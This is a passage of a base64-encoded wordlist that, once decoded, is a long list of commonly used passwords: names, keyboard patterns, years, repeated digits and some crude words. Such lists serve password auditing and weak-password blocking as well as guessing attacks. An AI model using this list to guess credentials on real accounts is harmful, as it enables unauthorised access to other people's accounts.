yYWNlcngNCnR1YW4NCmNyZWFteQ0KYm9zcw0KYm9ibw0KbXVzaWNtYW4NCndhcmNyYWZ0DQp3aW5kb3cNCmJsYWRlDQpzaHVhbmcNCnNoZWlsYQ0Kc2h1bg0KbGljaw0Kamlhbg0KbWljcm9zb2Z0DQpyb25nDQphbGxlbg0KZmVuZw0KZ2V0c29tZQ0Kc2FsbHkNCnF1YWxpdHkNCmtlbm5lZHkNCm1vcnJpc29uDQoxOTc3DQpiZW5nDQp3d3d3d3cNCnlveW95bw0KemhhbmcNCnNlbmcNCnRlZGR5DQpqb2FubmENCmFuZHJlYXMNCmhhcmRlcg0KbHVrZQ0KcWF6eHN3DQpxaWFuDQpjb25nDQpjaHVhbg0KZGVuZw0KbmFuZw0KYm9laW5nDQprZWVwZXINCndlc3Rlcm4NCmlzYWJlbGxlDQoxOTYzDQpzdWJhcnUNCnNoZW5nDQp0aHVnbGlmZQ0KdGVuZw0KamlvbmcNCm1pYW8NCm1hcnRpbmENCm1hbmcNCm1hbmlhYw0KcHVzc2llDQp0cmFjZXkNCmExYjJjMw0KY2xheXRvbg0KemhvdQ0Kemh1YW5nDQp4aW5nDQpzdG9uZWNvbA0Kc25vdw0Kc3B5ZGVyDQpsaWFuZw0KamlhbmcNCm1lbXBoaXMNCnJlZ2luYQ0KY2VuZw0KbWFnaWMxDQpsb2dpdGVjaA0KY2h1YW5nDQpkYXJrDQptaWxsaW9uDQpibG93DQpzZXNhbWUNCnNoYW8NCnBvaXNvbg0KdGl0dHkNCnRlcnJ5DQprdWFuDQprdWFpDQpreWxlDQptaWFuDQpndWFuDQpoYW1zdGVyDQpndWFpDQpmZXJyZXQNCmZsb3JlbmNlDQpnZW5nDQpkdWFuDQpwYW5nDQptYWlkZW4NCnF1YW4NCnZlbHZldA0Kbm9uZw0KbmVuZw0Kbm9va2llDQpidXR0b25zDQpiaWFuDQpiaW5nbw0KYmlhbw0KemhvbmcNCnplbmcNCnhpb25nDQp6aHVuDQp5aW5nDQp6b25nDQp4dWFuDQp6YW5nDQowLjAuMDAwDQpzdWFuDQpzaGVpDQpzaHVpDQpzaGFya3MNCnNoYW5nDQpzaHVhDQpzbWFsbA0KcGVuZw0KcGlhbg0KcGlhbw0KbGlhbw0KbWVuZw0KbWlhbWkNCnJlbmcNCmd1YW5nDQpjYW5nDQpjaGFuZ2UNCnJ1YW4NCmRpYW8NCmx1YW4NCmx1Y2FzDQpxaW5nDQpjaHVpDQpjaHVvDQpjdWFuDQpudWFuDQpuaW5nDQpoZW5nDQpodWFuDQprYW5zYXMNCm11c2NsZQ0KbW9ucm9lDQp3ZW5nDQp3aGl0bmV5DQoxcGFzc3dvcg0KYmx1ZW1vb24NCnpodWkNCnpodWENCnhpYW5nDQp6aGVuZw0Kemhlbg0KemhlaQ0Kemhhbw0Kemhhbg0KeW9tYW1hDQp6aGFpDQp6aHVvDQp6dWFuDQp0YXJoZWVsDQpzaG91DQpzaHVvDQp0aWFvDQpsYWR5DQpsZW9uYXJkDQpsZW5nDQprdWFuZw0Kamlhbw0KMTM1NzkNCmJhc2tldA0KcWlhbw0KcWlvbmcNCnFpYW5nDQpjaHVhaQ0Kbmlhbg0Kbmlhbw0KbmlhbmcNCmh1YWkNCjIyMjIyMjIyDQpiaWFuY2ENCnpodWFuDQp6aHVhaQ0Kc2h1YW4NCnNodWFpDQpzdGFyZHVzdA0KanVtcGVyDQptYXJnYXJldA0KYXJjaGllDQo2NjY2NjY2Ng0KY2hhcmxvdHQNCmZvcmdldA0KcXdlcnR6DQpib25lcw0KaGlzdG9yeQ0KbWlsdG9uDQp3YXRlcmxvbw0KMjAwMg0Kc3R1ZmYNCjExMjIzMzQ0DQpvZmZpY2UNCm9sZG1hbg0KcHJlc3Rvbg0KdHJhaW5zDQptdXJyYXkNCnZlcnRpZ28NCjI0NjgxMA0KYmxhY2sxDQpzd2FsbG93DQpzbWlsZXMNCnN0YW5kYXJkDQphbGV4YW5kcg0KcGFycm90DQpsdXRoZXINCnVzZXINCm5pY29sYXMNCjE5NzYNCnN1cmZpbmcNCnBpb25lZXINCnBldGUNCm1hc3RlcnMNCmFwcGxlMQ0KYXNkYXNkDQphdWJ1cm4NCmhhbm5pYmFsDQpmcm9udGllcg0KcGFuYW1hDQpsdWN5DQpidWZmeQ0KYnJpYW5uYQ0Kd2VsY29tZTENCnZldHRlDQpibHVlMjINCnNoZW1hbGUNCjExMTIyMg0KYmFnZ2lucw0KZ3Jvb3Z5DQpnbG9iYWwNCnR1cm5lcg0KMTgxODE4DQoxOTc5DQpibGFkZXMNCnNwYW5raW5nDQpsaWZlDQpieXRlbWUNCmxvYnN0ZXINCmNvbGxpbnMNCmRhd2cNCmhpbHRvbg0KamFwYW5lc2UNCjE5NzANCjE5NjQNCjI0MjQNCnBvbG8NCm1hcmt1cw0KY29jbw0KZGVlZGVlDQptaWtleQ0KMTk3Mg0KMTcxNzE3DQoxNzAxDQpzdHJpcA0KamVyc2V5DQpncmVlbjENCmNhcGl0YWwNCnNhc2hhDQpzYWRpZQ0KcHV0dGVyDQp2YWRlcg0Kc2V2ZW43DQpsZXN0ZXINCm1hcmNlbA0KYmFuc2hlZQ0KZ3JlbmRlbA0KZ2lsYmVydA0KZGlja3MNCmRlYWQNCmhpZGRlbg0KaWxvdmV1DQoxOTgwDQpzb3VuZA0KbGVkemVwDQptaWNoZWwNCjE0NzI1OA0KZmVtYWxlDQpidWdnZXINCmJ1ZmZldHQNCmJyeWFuDQpoZWxsDQprcmlzdGluYQ0KbW9sc29uDQoyMDIwDQp3b29raWUNCnNwcmludA0KdGhhbmtzDQpqZXJpY2hvDQoxMDIwMzANCmdyYWNlDQpmdWNraW4NCm1hbmR5DQpyYW5nZXIxDQp0cmVib3INCmRlZXB0aHJvYXQNCmJvbmVoZWFkDQptb2xseTENCm1pcmFnZQ0KbW9kZWxzDQoxOTg0DQoyNDY4DQpzdHVhcnQNCnNob3d0aW1lDQpzcXVpcnJlbA0KcGVudGl1bQ0KbWFyaW8NCmFuaW1lDQpnYXRvcg0KcG93ZGVyDQp0d2lzdGVyDQpjb25uZWN0DQpuZXB0dW5lDQpicnVubw0KYnV0dHMNCmVuZ2luZQ0KZWF0c2hpdA0KbXVzdGFuZ3MNCndvb2R5MQ0Kc2hvZ3VuDQpzZXB0ZW1iZQ0KcG9vaA0KamltYm8NCnJvZ2VyDQphbm5pZQ0KYmFjb24NCmNlbnRlcg0KcnVzc2lhbg0Kc2FiaW5lDQpkYW1pZW4NCm1vbGxpZQ0Kdm95ZXVyDQoyNTI1DQozNjM2MzYNCmxlb25hcmRvDQpjYW1lbA0KY2hhaXINCmdlcm1hbnkNCmdpYW50DQpxcXFxDQpudWRpc3QNCmJvbmUNCnNsZWVweQ0KdGVxdWlsYQ0KbWVnYW4NCmZpZ2h0ZXINCmdhcnJldHQNCmRvbWluaWMNCm9iaXdhbg0KbWFrYXZlbGkNCnZhY2F0aW9uDQp3YWxudXQNCjE5NzQNCmxhZHlidWcNCmNhbnRvbmENCmNjYmlsbA0Kc2F0YW4NCnJ1c3R5MQ0KcGFzc3dvcjENCmNvbHVtYmlhDQpuYXBvbGVvbg0KZHVzdHkNCmtpc3NtZQ0KbW90b3JvbGENCndpbGxpYW0xDQoxOTY3DQp6enp6DQpza2F0ZXINCnNtdXQNCnBsYXkNCm1hdHRoZXcxDQpyb2JpbnNvbg0KdmFsbGV5DQpjb29saW8NCmRhZ2dlcg0KYm9uZXINCmJ1bGwNCmhvcm5kb2cNCmphc29uMQ0KYmxha2UNCnBlbmd1aW5zDQpyZXNjdWUNCmdyaWZmZXkNCjhqNHllM3V6DQpjYWxpZm9ybg0KY2hhbXBzDQpxd2VydHl1aW9wDQpwb3J0bGFuZA0KcXVlZW4NCmNvbHQ0NQ0KYm9hdA0KeHh4eHh4eA0KeGFuYWR1DQp0YWNvbWENCm1hc29uDQpjYXJwZXQNCmdnZ2dnZw0Kc2FmZXR5DQpwYWxhY2UNCml0YWxpYQ0Kc3RldmllDQpwaWN0dXJzDQpwaWNhc3NvDQp0aG9uZ3MNCnRlbXBlc3QNCnJpY2FyZG8NCnJvYmVydHMNCmFzZDEyMw0KaGFpcnkNCmZveHRyb3QNCmdhcnkNCm5pbXJvZA0KaG90Ym95DQozNDM0MzQNCjExMTExMTENCmFzZGZnaGprbA0KZ29vc2UNCm92ZXJsb3JkDQpibG9vZA0Kd29vZA0Kc3RyYW5nZXINCjQ1NDU0NQ0Kc2hhb2xpbg0Kc29vbmVycw0Kc29jcmF0ZXMNCnNwaWRlcm1hbg0KcGVhbnV0cw0KbWF4aW5lDQpyb2dlcnMNCjEzMTMxMzEzDQphbmRyZXcxDQpmaWx0aHkNCmRvbm5pZQ0Kb2h5ZWFoDQphZnJpY2ENCm5hdGlvbmFsDQprZW5ueQ0Ka2VpdGgNCm1vbmlxdWUNCmludHJlcGlkDQpqYXNtaW4NCnBpY2tsZXMNCmFzc2Fzcw0KZnJpZ2h0DQpwb3RhdG8NCmRhcndpbg0KaGhoaGhoDQpraW5nZG9tDQp3ZWV6ZXINCjQyNDI0Mg0KcGVwc2kxDQp0aHJvYXQNCnJvbWVvDQpnZXJhcmQNCmxvb2tlcg0KcHVwcHkNCmJ1dGNoDQptb25pa2ENCnN1emFubmUNCnN3ZWV0cw0KdGVtcGxlDQpsYXVyaWUNCmpvc2gNCm1lZ2FkZXRoDQphbmFsc2V4DQpueW1ldHMNCmRkZGRkZGQNCmJpZ2JhbGxzDQpzdXBwb3J0DQpzdGljaw0KdG9kYXkNCmRvd24NCm9ha2xhbmQNCm9vb29vbw0KcXdlYXNkDQpjaHVja3kNCmJyaWRnZQ0KY2Fycm90DQpjaGFyZ2Vycw0KZGlzY292ZXINCmRvb2tpZQ0KY29uZG9yDQpuaWdodA0KYnV0bGVyDQpob292ZXINCmhvcm55MQ0KaXNhYmVsbGENCnN1bnJpc2UNCnNpbm5lcg0Kam9qbw0KbWVnYXBhc3MNCm1hcnRpbmkNCmFzc2Z1Y2sNCmdyYXRlZnVsDQpmZmZmZmYNCmFiaWdhaWwNCmVzdGhlcg0KbXVzaHJvb20NCmphbmljZQ0KamFtYWljYQ0Kd3JpZ2h0DQpzaW1zDQpzcGFjZQ0KdGhlcmUNCnRpbW15DQo3NjU0MzIxDQo3Nzc3Nw0KY2NjY2NjDQpnaXptb2RvDQpyb3hhbm5lDQpyYWxwaA0KdHJhY3Rvcg0KY3Jpc3RpbmENCmRhbmNlDQpteXBhc3MNCmhvbmdrb25nDQpoZWxlbmENCjE5NzUNCmJsdWUxMjMNCnBpc3NpbmcNCnRob21hczENCnJlZHJlZA0KcmljaA0KYmFza2V0YmFsbA0KYXR0YWNrDQpjYXNoDQpzYXRhbjY2Ng0KZHJ1bmsNCmRpeGllDQpkdWJsaW4NCmJvbGxveA0Ka2luZ2tvbmcNCmthdHJpbmENCm1pbGVzDQoxOTcxDQoyMjIyMg0KMjcyNzI3DQpzZXh4DQpwZW5lbG9wZQ0KdGhvbXBzb24NCmFueXRoaW5nDQpiYmJiDQpiYXR0bGUNCmdyaXp6bHkNCnBhc3NhdA0KcG9ydGVyDQp0cmFjeQ0KZGVmaWFudA0KYm93bGVyDQprbmlja2Vycw0KbW9uaXRvcg0Kd2lzZG9tDQp3aWxkDQpzbGFwcHkNCnRob3INCmxldHNnbw0Kcm9iZXJ0MQ0KZmVldA0KcnVzaA0KYnJvd25pZQ0KaHVkc29uDQowOTg3NjUNCnBsYXlpbmcNCnBsYXl0aW1lDQpsaWdodG5pbg0KbWVsdmluDQphdG9taWMNCmJhcnQNCmhhd2sNCmdva3UNCmdsb3J5DQpsbGxsbGwNCnF3YXN6eA0KY29zbW9zDQpib3Njbw0Ka25pZ2h0cw0KYmVudGxleQ0KYmVhc3QNCnNsYXBzaG90DQpsZXdpcw0KYXNzd29yZA0KZnJvc3R5DQpnaWxsaWFuDQpzYXJhDQpkdW1iYXNzDQptYWxsYXJkDQpkZGRkDQpkZWFubmENCmVsd29vZA0Kd2FsbHkNCjE1OTM1Nw0KdGl0bGVpc3QNCmFuZ2Vsbw0KYXVzc2llDQpndWVzdA0KZ29sZmluZw0KZG9vYmllDQpsb3ZlaXQNCmNobG9lDQplbGxpb3R0DQp3ZXJld29sZg0KdmlwZXJzDQpqYW5pbmUNCjE5NjUNCmJsYWJsYQ0Kc3VyZg0Kc3Vja2luZw0KdGFyZGlzDQpzZXJlbmENCnNoZWxsZXkNCnRoZWdhbWUNCmxlZ2lvbg0KcmViZWxzDQpmZXJuYW5kbw0KZmFzdA0KZ2VyYWxkDQpzYXJhaDENCmRvdWJsZQ0Kb25lbG92ZQ0KbG91bG91DQp0b3RvDQpjcmFzaA0KYmxhY2tjYXQNCjAwMDcNCnRhY29iZWxsDQpzb2NjZXIxDQpqZWRpDQptYW51ZWwNCm1ldGhvZA0Kcml2ZXINCmNoYXNlDQpsdWR3aWcNCnBvb3BpZQ0KZGVycmljaw0KYm9vYg0KYnJlYXN0DQpraXR0eWNhdA0KaXNhYmVsDQpiZWxseQ0KcGlrYWNodQ0KdGh1bmRlcjENCnRoYW5reW91DQpqb3NlDQpjZWxlc3RlDQpjZWx0aWNzDQpmcmFuY2VzDQpmcm9nZ2VyDQpzY29vYnlkbw0Kc2FiYmF0aA0KY29sdHJhbmUNCmJ1ZG1hbg0Kd2lsbGlzDQpqYWNrYWwNCmJpZ2dlcg0Kenp6enoNCnNpbHZpYQ0Kc29vbmVyDQpsaWNraW5nDQpnb3BoZXINCmdlaGVpbQ0KbG9uZXN0YXINCnByaW11cw0KcG9vcGVyDQpuZXdwYXNzDQpicmFzaWwNCmhlYXRoZXIxDQpodXNrZXINCmVsZW1lbnQNCm1vb21vbw0KYmVlZmNha2UNCnp6enp6enp6DQp0YW1teQ0Kc2hpdHR5DQpzbW9raW4NCnBlcnNvbmFsDQpqampqDQphbnRob255MQ0KYW51YmlzDQpiYWNrdXANCmdvcmlsbGENCmZ1Y2tmYWNlDQpwYWludGVyDQpsb3dyaWRlcg0KcHVua3JvY2sNCnRyYWZmaWMNCmNsYXVkZQ0KZGFuaWVsYQ0KZGFsZQ0KZGVsdGExDQpuYW5jeQ0KYm95cw0KZWFzeQ0Ka2lzc2luZw0Ka2VsbGV5DQp3ZW5keQ0KdGhlcmVzYQ0KYW1hem9uDQphbGFuDQpmYXRhc3MNCmRvZGdlcmFtDQpkaW5nZG9uZw0KbWFsY29sbQ0KcXFxcXFxcXENCmJyZWFzdHMNCmJvb3RzDQpob25kYTENCnNwaWRleQ0KcG9rZXINCnRlbXANCmpvaG5qb2huDQptaWd1ZWwNCjE0Nzg1Mg0KYXJjaGVyDQphc3Nob2xlMQ0KZG9nZG9nDQp0cmlja3kNCmNydXNhZGVyDQp3ZWF0aGVyDQpzeXJhY3VzZQ0Kc3BhbmttZQ0Kc3BlYWtlcg0KbWVyaWRpYW4NCmFtYWRldXMNCmJhY2sNCmhhcmxleTENCmZhbGNvbnMNCmRvcm90aHkNCnR1cmtleTUwDQprZW53b29kDQprZXlib2FyZA0KaWxvdmVzZXgNCjE5NzgNCmJsYWNrbWFuDQpzaGF6YW0NCnNoYWxvbQ0KbGlja2l0DQpqaW1ib2INCnJpY2htb25kDQpyb2xsZXINCmNhcnNvbg0KY2hlY2sNCmZhdG1hbg0KZnVubnkNCmdhcmJhZ2UNCnNhbmRpZWdvDQpsb3ZpbmcNCm1hZ251cw0KY29vbGR1ZGUNCmNsb3Zlcg0KbW9iaWxlDQpiZWxsDQpwYXl0b24NCnBsdW1iZXINCnRleGFzMQ0KdG9vbA0KdG9wcGVyDQpqZW5uYQ0KbWFyaW5lcnMNCnJlYmVsDQpoYXJtb255DQpjYWxpZW50ZQ0KY2VsaWNhDQpmbGV0Y2hlcg0KZ2VybWFuDQpkaWFuYQ0Kb3hmb3JkDQpvc2lyaXMNCm9yZ2FzbQ0KcHVua2luDQpwb3JzY2hlOQ0KdHVlc2RheQ0KY2xvc2UNCmJyZWV6ZQ0KYm9zc21hbg0Ka2FuZ2Fyb28NCmJpbGxpZQ0KbGF0aW5hcw0KanVkaXRoDQphc3Ryb3MNCnNjcnVmZnkNCmRvbm5hDQpxd2VydHl1DQpkYXZpcw0KaGVhcnRzDQprYXRoeQ0KamFtbWVyDQpqYXZhDQpzcHJpbmdlcg0KcmhvbmRhDQpyaWNreQ0KMTEyMg0KZ29vZHRpbWUNCmNoZWxzZWExDQpmcmVja2xlcw0KZmx5Ym95DQpkb29kbGUNCmNpdHkNCm5lYnJhc2thDQpib290aWUNCmtpY2tlcg0Kd2VibWFzdGVyDQp2dWxjYW4NCml2ZXJzb24NCjE5MTkxOQ0KYmx1ZWV5ZXMNCnN0b25lcg0KMzIxMzIxDQpmYXJzaWRlDQpydWdieQ0KZGlyZWN0b3INCnB1c3N5NjkNCnBvd2VyMQ0KYm9iYmllDQpoZXJzaGV5DQpoZXJtZXMNCm1vbm9wb2x5DQp3ZXN0DQpiaXJkbWFuDQpibGVzc2VkDQpibGFja2phYw0Kc291dGhlcm4NCnBldGVycGFuDQp0aHVtYnMNCmxhd3llcg0KbWVsaW5kYQ0KZmluZ2Vycw0KZnVja3lvdTENCnJycnJycg0KYTFiMmMzZDQNCmNva2UNCm5pY29sYQ0KYm9oaWNhDQpoZWFydA0KZWx2aXMxDQpraWRzDQpibGFja3kNCnN0b3JpZXMNCnNlbnRpbmVsDQpzbmFrZTENCnBob2ViZQ0KamVzc2UNCnJpY2hhcmQxDQoxMjM0YWJjZA0KZ3VhcmRpYW4NCmNhbmR5bWFuDQpmaXN0aW5nDQpzY2FybGV0DQpkaWxkbw0KcGFuY2hvDQptYW5kaW5nbw0KbHVja3k3DQpjb25kb20NCm11bmNoa2luDQpiaWxseWJveQ0Kc3VtbWVyMQ0Kc3R1ZGVudA0Kc3dvcmQNCnNraWluZw0Kc2VyZ2lvDQpzaXRlDQpzb255DQp0aG9uZw0Kcm9vdGJlZXINCmFzc2Fzc2luDQpjYXNzaWR5DQpmcmVkZXJpYw0KZmZmZmYNCmZpdG5lc3MNCmdpb3Zhbm5pDQpzY2FybGV0dA0KZHVyYW5nbw0KcG9zdGFsDQphY2hpbGxlcw0KZGF3bg0KZHlsYW4NCmtpc3Nlcw0Kd2FycmlvcnMNCmltYWdpbmUNCnBseW1vdXRoDQp0b3Bkb2cNCmFzdGVyaXgNCmhhbGxvDQpjYW1lbHRvZQ0KZnVja2Z1Y2sNCmJyaWRnZXQNCmVlZWVlZQ0KbW91dGgNCndlaXJkDQp3aWxsDQpzaXRobG9yZA0Kc29tbWVyDQp0b2J5DQp0aGVraW5nDQpqdWxpZXQNCmF2ZW5nZXINCmJhY2tkb29yDQpnb29kYnllDQpjaGV2cm9sZQ0KZmFpdGgNCmxvcnJhaW5lDQp0cmFuY2UNCmNvc3dvcnRoDQpicmFkDQpob3VzZXMNCmhvbWVycw0KZXRlcm5pdHkNCmtpbmdwaW4NCnZlcmJhdGltDQppbmN1YnVzDQoxOTYxDQpibG9uZA0KemFwaG9kDQpzaGlsb2gNCnNwdXJzDQpzdGF0aW9uDQpqZW5uaWUNCm1heW5hcmQNCm1pZ2h0eQ0KYWxpZW5zDQpoYW5rDQpjaGFybHkNCnJ1bm5pbmcNCmRvZ21hbg0Kb21lZ2ExDQpwcmludGVyDQphZ2dpZXMNCmNob2NvbGF0ZQ0KZGVhZGhlYWQNCmhvcGUNCmphdmllcg0KYml0Y2gxDQpzdG9uZTU1DQpwaW5lYXBwbA0KdGhla2lkDQpsaXp6aWUNCnJvY2tldHMNCmFzaHRvbg0KY2FtZWxzDQpmb3JtdWxhDQpmb3JyZXN0DQpyb3NlbWFyeQ0Kb3JhY2xlDQpyYWluDQpwdXNzZXkNCnBvcmtjaG9wDQphYmNkZQ0KY2xhbmN5DQpuZWxsaWUNCm15c3RpYw0KaW5mZXJubw0KYmxhY2tkb2cNCnN0ZXZlMQ0KcGF1bGluZQ0KYWxleGFuZGVyDQphbGljZQ0KYWxmYQ0KZ3J1bXB5DQpmbGFtZXMNCnNjcmVhbQ0KbG9uZWx5DQpwdWZmeQ0KcHJveHkNCnZhbGhhbGxhDQp1bnJlYWwNCmN5bnRoaWENCmhlcmJpZQ0KZW5nYWdlDQp5eXl5eXkNCjAxMDEwMQ0Kc29sb21vbg0KcGlzdG9sDQptZWxvZHkNCmNlbGViDQpmbHlpbmcNCmdnZ2cNCnNhbnRpYWdvDQpzY290dGllDQpvYWtsZXkNCnBvcnR1Z2FsDQphMTIzNDUNCm5ld2JpZQ0KbW1tbQ0KdmVudXMNCjFxYXp4c3cyDQpiZXZlcmx5DQp6b3Jybw0Kd29yaw0Kd3JpdGVyDQpzdHJpcHBlcg0Kc2ViYXN0aWENCnNwcmVhZA0KcGhpbA0KdG9iaWFzDQpsaW5rcw0KbWVtYmVycw0KbWV0YWwNCjEyMjENCmFuZHJlDQo1NjU2NTYNCmZ1bmZ1bg0KdHJvamFucw0KYWdhaW4NCmN5YmVyDQpodXJyaWNhbg0KbW9uZXlzDQoxeDJ6a2c4dw0KemV1cw0KdGhpbmcNCnRvbWF0bw0KbGlvbg0KYXRsYW50aWMNCmNlbGluZQ0KdXNhMTIzDQp0cmFucw0KYWNjb3VudA0KYWFhYWFhYQ0KaG9tZXJ1bg0KaHlwZXJpb24NCmtldmluMQ0KYmxhY2tzDQo0NDQ0NDQ0NA0Kc2tpdHRsZXMNCnNlYW4NCmhhc3RpbmdzDQpmYXJ0DQpnYW5nYmFuZw0KZnViYXINCnNhaWxib2F0DQpvbGRlcg0Kb2lsZXJzDQpjcmFpZw0KY29ucmFkDQpjaHVyY2gNCmRhbWlhbg0KZGVhbg0KYnJva2VuDQpidXN0ZXIxDQpoaXRoZXJlDQppbW1vcnRhbA0Kc3RpY2tzDQpwaWxvdA0KcGV0ZXJzDQpsZXhtYXJrDQpqZXJrb2ZmDQptYXJ5bGFuZA0KYW5kZXJzDQpjaGVlcnMNCnBvc3N1bQ0KY29sdW1idXMNCmN1dHRlcg0KbXVwcGV0DQpiZWF1dGlmdWwNCnN0b2xlbg0Kc3dvcmRmaXNoDQpzcG9ydA0Kc29uaWMNCnBldGVyMQ0KamV0aHJvDQpyb2Nrb24NCmFzZGZnaGoNCnBhc3MxMjMNCnBhcGVyDQpwb3Jub3MNCm5jYzE3MDFhDQpib290eXMNCmJ1dHRtYW4NCmJvbmpvdXINCmVzY2FwZQ0KMTk2MA0KYmVja3kNCmJlYXJzDQozNjI0MzYNCnNwYXJ0YW5zDQp0aW5tYW4NCnRocmVlc29tDQpsZW1vbnMNCm1heG1heA0KMTQxNA0KYmJiYmINCmNhbWVsb3QNCmNoYWQNCmNoZXdpZQ0KZ29nbw0KZnVzaW9uDQpzYWludA0KZGlsbGlnYWYNCm5vcGFzcw0KbXlzZWxmDQpodXN0bGVyDQpodW50ZXIxDQp3aGl0ZXkNCmJlYXN0MQ0KeWVzeWVzDQpzcGFuaw0Kc211ZGdlDQpwaW5rZmxveQ0KcGF0cmlvdA0KbGVzcGF1bA0KYW5uZXR0ZQ0KaGFtbWVycw0KY2F0YWxpbmENCmZpbmlzaA0KZm9ybXVsYTENCnNhdXNhZ2UNCnNjb290ZXIxDQpvcmlvbGVzDQpvc2NhcjENCm92ZXINCmNvbG9tYmlhDQpjcmFtcHMNCm5hdHVyYWwNCmVhdGluZw0KZXhvdGljDQppZ3VhbmENCmJlbGxhDQpzdWNrZXJzDQpzdHJvbmcNCnNoZWVuYQ0Kc3RhcnQNCnNsYXZlDQpwZWFybA0KdG9wY2F0DQpsYW5jZWxvdA0KYW5nZWxpY2ENCm1hZ2VsYW4NCnJhY2VyDQpyYW1vbmENCmNydW5jaA0KYnJpdGlzaA0KYnV0dG9uDQplaWxlZW4NCnN0ZXBoDQo0NTYxMjMNCnNraW5ueQ0Kc2Vla2luZw0Kcm9ja2hhcmQNCmNoaWVmDQpmaWx0ZXINCmZpcnN0DQpmcmVha3MNCnNha3VyYQ0KcGFjbWFuDQpwb29udGFuZw0KZGFsdG9uDQpuZXdsaWZlDQpob21lcjENCmtsaW5nb24NCndhdGNoZXINCndhbGxleWUNCnRhc2hhDQp0YXN0eQ0Kc2luYXRyYQ0Kc3RhcnNoaXANCnN0ZWVsDQpzdGFyYnVjaw0KcG9uY2hvDQphbWJlcjENCmdvbnpvDQpncm92ZXINCmNhdGhlcmluDQpjYXJvbA0KY2FuZGxlDQpmaXJlZmx5DQpnb2JsaW4NCnNjb3RjaA0KZGl2ZXINCnVzbWMNCmh1c2tpZXMNCmVsZXZlbg0Ka2VudHVja3kNCmtpdGthdA0KaXNyYWVsDQpiZWNraGFtDQpiaWN5Y2xlDQp5b3VybW9tDQpzdHVkaW8NCnRhcmENCjMzMzMzMzMzDQpzaGFuZQ0Kc3BsYXNoDQpqaW1teTENCnJlYWxpdHkNCjEyMzQ0MzIxDQpjYWl0bGluDQpmb2N1cw0Kc2FwcGhpcmUNCm1haWxtYW4NCnJhaWRlcnMxDQpjbGFyaw0KZGRkZGQNCmhvcHBlcg0KZXhjYWxpYnUNCm1vcmUNCndpbGJ1cg0KaWxsaW5pDQppbXBlcmlhbA0KcGhpbGxpcHMNCmxhbnNpbmcNCm1heHgNCmdvdGhpYw0KZ29sZmJhbGwNCmNhcmx0b24NCmNhbWlsbGUNCmZhY2lhbA0KZnJvbnQyNDINCm1hY2RhZGR5DQpxd2VyMTIzNA0KdmVjdHJhDQpjb3dib3lzMQ0KY3JhenkxDQpkYW5ueWJveQ0KamFuZQ0KYmV0dHkNCmJlbm55DQpiZW5uZXR0DQpsZWFkZXINCm1hcnRpbmV6DQphcXVhcml1cw0KYmFya2xleQ0KaGF5ZGVuDQpjYXVnaHQNCmZyYW5reQ0KZmZmZg0KZmxveWQNCnNhc3N5DQpwcHBwDQpwcHBwcHBwcA0KcHJvZGlneQ0KY2xhcmVuY2UNCm5vb2RsZQ0KZWF0cHVzc3kNCnZvcnRleA0Kd2Fua2luZw0KYmVhdHJpY2UNCmJpbGx5MQ0Kc2llbWVucw0KcGVkcm8NCnBoaWxsaWVzDQpyZXNlYXJjaA0KZ3JvdXBzDQpjYXJvbHluDQpjaGV2eTENCmNjY2MNCmZyaXR6DQpnZ2dnZ2dnZw0KZG91Z2hib3kNCmRyYWN1bGENCm51cnNlcw0KbG9jbw0KbWFkcmlkDQpsb2xsaXBvcA0KdHJvdXQNCnV0b3BpYQ0KY2hyb25vDQpjb29sZXINCmNvbm5lcg0KbmV2YWRhDQp3aWJibGUNCndlcm5lcg0Kc3VtbWl0DQptYXJjbw0KbWFyaWx5bg0KMTIyNQ0KYmFiaWVzDQpjYXBvbmUNCmZ1Z2F6aQ0KcGFuZGENCm1hbWENCnFhendzeGVkDQpwdXBwaWVzDQp0cml0b24NCjk4NzYNCmNvbW1hbmQNCm5ubm5ubg0KZXJuZXN0DQptb21vbmV5DQppZm9yZ290DQp3b2xmaWUNCnN0dWRseQ0Kc2hhd24NCnJlbmVlDQphbGllbg0KaGFtYnVyZw0KODFmdWtrYw0KNzQxODUyDQpjYXRtYW4NCmNoaW5hDQpmb3Jnb3QNCmdhZ2dpbmcNCnNjb3R0MQ0KZHJldw0Kb3JlZ29uDQpxd2Vxd2UNCnRyYWluDQpjcmF6eWJhYg0KZGFuaWVsMQ0KY3V0bGFzcw0KYnJvdGhlcnMNCmhvbGVzDQpoZWlkaQ0KbW90aGVycw0KbXVzaWMxDQp3aGF0DQp3YWxydXMNCjE5NTcNCmJpZ3RpbWUNCmJpa2UNCnh0cmVtZQ0Kc2ltYmENCnNzc3MNCnJvb2tpZQ0KYW5naWUNCmJhdGhpbmcNCmZyZXNoDQpzYW5jaGV6DQpyb3R0ZW4NCm1hZXN0cm8NCmx1aXMNCmxvb2sNCnR1cmJvMQ0KOTk5OTkNCmJ1dHRob2xlDQpoaGhoDQplbGlqYWgNCm1vbnR5DQpiZW5kZXINCnlvZGENCnNoYW5pYQ0Kc2hvY2sNCnBoaXNoDQp0aGVjYXQNCnJpZ2h0bm93DQpyZWFnYW4NCmJhZGRvZw0KYXNpYQ0KZ3JlYXRvbmUNCmdhdGV3YXkxDQpyYW5kYWxsDQphYnN0cg0KbmFwc3Rlcg0KYnJpYW4xDQpib2dhcnQNCmhpZ2gNCmhpdGxlcg0KZW1tYQ0Ka2lsbA0Kd2VhdmVyDQp3aWxkZmlyZQ0KamFja3NvbjENCmlzYWlhaA0KMTk4MQ0KYmVsaW5kYQ0KYmVhbmVyDQp5b3lvDQowLjAuMC4wMDANCnN1cGVyMQ0Kc2VsZWN0DQpzbnVnZ2xlcw0Kc2x1dHR5DQpzb21lDQpwaG9lbml4MQ0KdGVjaG5pY3MNCnRvb24NCnJhdmVuMQ0KcmF5cmF5DQoxMjM3ODkNCjEwNjYNCmFsYmlvbg0KZ3JlZW5zDQpmYXNoaW9uDQpnZXNwZXJydA0Kc2FudGFuYQ0KcGFpbnQNCnBvd2VsbA0KY3JlZGl0DQpkYXJsaW5nDQpteXN0ZXJ5DQpib3dzZXINCmJvdHRsZQ0KYnJ1Y2VsZWUNCmhlaGVoZQ0Ka2VsbHkxDQptb2pvDQoxOTk4DQpiaWtpbmkNCndvb2Z3b29mDQp5eXl5DQpzdHJhcA0Kc2l0ZXMNCnNwZWFycw0KdGhlb2RvcmUNCmp1bGl1cw0KcmljaGFyZHMNCmFtZWxpYQ0KY2VudHJhbA0KZioqaw0KbnlqZXRzDQpwdW5pc2hlcg0KdXNlcm5hbWUNCnZhbmlsbGENCnR3aXN0ZWQNCmJyeWFudA0KYnJlbnQNCmJ1bmdob2xlDQpoZXJlDQplbGl6YWJldGgNCmVyaWNhDQpraW1iZXINCnZpYWdyYQ0KdmVyaXRhcw0KcG9ueQ0KcG9vbA0K